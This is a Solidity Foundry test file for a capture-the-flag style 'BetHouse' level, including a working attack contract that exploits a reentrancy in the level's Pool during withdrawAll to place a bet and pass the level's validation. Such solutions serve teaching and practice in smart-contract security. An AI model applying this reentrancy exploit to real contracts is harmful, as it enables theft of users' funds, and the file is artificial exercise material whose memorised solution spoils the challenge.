pragma solidity ^0.8.0;

import "src/levels/BetHouse/BetHouseFactory.sol";
import {BetHouse, PoolToken, Pool} from "src/levels/BetHouse/BetHouse.sol";
import "forge-std/Test.sol";

contract BetHouseAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    BetHouseFactory public factory;
    BetHouse public instance;

    function setUp() public {
        factory = new BetHouseFactory();
        instance = BetHouse(payable(factory.createInstance(dummyPlayerAddress)));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress, dummyPlayerAddress);
        vm.deal(dummyPlayerAddress, 1 ether);
        BetHouseAttack attackContract =
            new BetHouseAttack(address(instance), payable(instance.pool()), Pool(instance.pool()).depositToken());
        PoolToken(Pool(instance.pool()).depositToken()).transfer(address(attackContract), 5);
        attackContract.attack{value: 0.001 ether}();
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
    }
}

contract BetHouseAttack {
    BetHouse target;
    Pool pool;
    PoolToken depositToken;
    address bettor;

    constructor(address target_, address payable pool_, address depositToken_) payable {
        target = BetHouse(target_);
        pool = Pool(pool_);
        depositToken = PoolToken(depositToken_);
        bettor = msg.sender;
    }

    function attack() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        pool.withdrawAll();
    }

    receive() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        pool.lockDeposits();
        target.makeBet(bettor);
    }
}
